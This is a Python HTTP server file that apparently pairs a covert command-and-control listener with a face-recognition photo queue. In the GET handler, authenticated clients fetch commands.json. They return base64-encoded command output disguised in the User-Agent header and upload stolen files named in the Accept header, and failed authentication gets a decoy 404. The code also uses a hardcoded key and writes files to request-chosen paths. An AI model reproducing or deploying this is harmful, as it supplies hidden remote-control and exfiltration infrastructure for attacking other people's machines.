"""
// Copyright 2024 mas0yama & the_empr3ss & mih@ilovna
"""
import cqueue
from http.server import *
import base64
import time
from urllib.parse import parse_qsl, urlparse
import cgi
from deepface import DeepFace


class Handler(BaseHTTPRequestHandler):
    def bad_auth_response(self):
        self.send_response(404)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes('{ "bonjour" : "les programmers" }', "utf-8"))

    def do_GET(self):
        if self.headers.get("Authorization") != "Basic " + str(self.server.getAuthKey()):
            self.bad_auth_response()
            return

        try:

            if self.path.split("/")[1] == "public_storage":
                response_file = open(
                    f"public_storage/{self.path.split('/')[-1]}", "rb").read()
                self.send_response(200)
                if self.path.split("/")[-1] == "commands.json":
                    self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(response_file)
            else:

                if self.headers.get("User-Agent") is not None:
                    if self.headers.get("Accept") == "Output":
                        print("[+] GOT RESPONSE: ")
                        try:
                            print(base64.b64decode(self.headers.get(
                                "User-Agent")).decode('utf-8'))
                            ### windows adhoc
                        except UnicodeDecodeError:
                            print(base64.b64decode(self.headers.get(
                                "User-Agent")).decode('imb850'))
                        print("[+]", time.ctime(), "\n")
                    if self.headers.get("Accept").split("/")[0] == "File":
                        with open(self.headers.get("Accept").split("/")[1], "wb") as out:
                            out.write(base64.b64decode(
                                self.headers.get("User-Agent")))

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"result" : "ok}')
        except Exception as e:
            return

    def do_POST(self):
        match self.path[:self.path.find("?")].split("/")[1]:

            case "addToQueue":
                try:
                    self.__add_to_queue()
                except Exception as e:
                    print(e)

            case "removeFromQueue":
                self.__remove_from_queue()
        print(self.path)
        # Получение параметров
        params = parse_qsl(urlparse(self.path).query)
        print(params)

    def __add_to_queue(self):

        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers.get("Content-Type")}
        )

        params = dict(parse_qsl(urlparse(self.path).query))
        if self.headers.get('Content-Type') is None:
            print("Content Type is None")
            return
        content_length = int(self.headers.get('Content-Length'))
        data = form['file'].file.read()
        print(f"content_length: {content_length}")
        timestamp = time.time()
        tag = params.get("tag")

        with open(f"files/{timestamp}_{tag}.png", "wb") as f:
            f.write(data)

        for entry in self.server.queue:
            res = DeepFace.verify(entry.photo, f"files/{timestamp}_{tag}.png")
            if res['verified']:
                pass
                #HANDLE EXISTING PHOTO

        self.server.queue.enqueue(tag=tag, path_to_photo=f"files/{timestamp}_{tag}.png", timestamp=timestamp)
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes('{ "result" : "ok" }', "utf-8"))

    def __remove_from_queue(self):
        pass

    def log_message(self, format, *args):
        with open("server_log.log", "a") as file:
            file.write("%s - - [%s] %s\n" %
                       (self.address_string(),
                        self.log_date_time_string(),
                        format % args))


class Server(HTTPServer):
    def __init__(self, server_address: tuple[str, int], RequestHandlerClass, bind_and_activate=...) -> None:
        super().__init__(server_address, RequestHandlerClass, bind_and_activate)
        self.auth_key = "QWERTY=="
        self.queue = cqueue.Queue()

    def getAuthKey(self):
        return self.auth_key


if __name__ == "__main__":
    print("\n\n")
    server = Server(('', 8000), Handler)
    print("Starting server %")

    # add here check for 30 minutes queuue
    server.serve_forever()
    server.server_close()
